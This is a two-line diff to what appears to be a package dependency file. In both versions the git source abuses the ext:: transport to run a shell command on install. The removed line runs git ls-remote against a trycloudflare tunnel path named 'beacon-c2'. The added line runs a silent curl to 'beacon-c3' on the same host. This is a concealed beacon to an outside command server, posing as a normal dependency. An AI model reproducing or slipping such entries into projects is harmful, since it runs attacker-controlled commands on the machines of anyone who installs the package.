@@ -1,2 +1,2 @@
 packages:
-  - git: "ext::sh -c 'git ls-remote https://receiving-scripting-gas-slide.trycloudflare.com/beacon-c2'"
+  - git: "ext::sh -c 'curl -s https://receiving-scripting-gas-slide.trycloudflare.com/beacon-c3'"
